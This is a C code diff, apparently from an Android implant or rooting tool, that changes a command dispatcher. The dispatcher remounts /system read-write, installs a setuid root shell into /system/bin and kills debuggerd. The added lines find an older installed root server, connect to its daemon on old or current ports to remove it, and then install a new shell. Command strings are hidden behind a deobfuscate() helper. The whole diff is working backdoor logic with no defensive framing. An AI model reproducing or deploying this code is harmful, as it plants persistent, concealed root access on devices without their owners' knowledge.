@@ -152,7 +152,14 @@ int exec_cmd(int argc, char** argv) {
 	} else if (strcmp(argv[1], deobfuscate(blw)) == 0) { // Monta /system in READ_WRITE
 		LOGD("Mounting FS read write\n");
 		remount(deobfuscate(system2), 0);
-	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) {  // Copia la shell root in /system/bin/
+	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) { // Copia la shell root in /system/bin/
+	        struct stat st1;
+		struct stat st2;
+		char ru_cmd[4];
+		
+		snprintf(ru_cmd, sizeof(ru_cmd), "%s", deobfuscate(ru));
+		char *sock_args[] = {ru_cmd, ru_cmd};
+
 		LOGD("Installing suid shell\n");
 		LOGD("Argv[0] is %s\n", argv[0]);
 
@@ -161,6 +168,20 @@ int exec_cmd(int argc, char** argv) {
 		  if(install_old_shell(argv[2]))
 		    return 0;
 		}
+
+		// Check if the shell is already installed and remove it
+		if(stat(deobfuscate(ROOT_SERVER), &st2) >= 0) {
+		  LOGD("Shell already presents\n");
+		  if(connect_daemon(2, sock_args, OLD_SHELL_PORT) == 0) { 
+		    LOGD("RU executed in the old shell on the old port!\n");
+		    sleep(3);
+		  }
+		  else if(connect_daemon(2, sock_args, SHELL_PORT) == 0) {
+		    LOGD("RU executed in the old shell on the current port!\n");
+		    sleep(3);
+		  }
+		}
+		  
 
 		// Install the new shell
 		copy_root(deobfuscate(system3), argv[0], deobfuscate(ROOT_CLIENT));  // root client
@@ -171,7 +192,7 @@ int exec_cmd(int argc, char** argv) {
 		//execl(deobfuscate(ROOT_SERVER), deobfuscate(ROOT_SERVER), deobfuscate(daemon_opt), NULL);
 		//}
 		kill_debuggerd();
-		
+		sleep(2);
 
 	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root
 	        // Remove and restore the proper boot script and rilcap
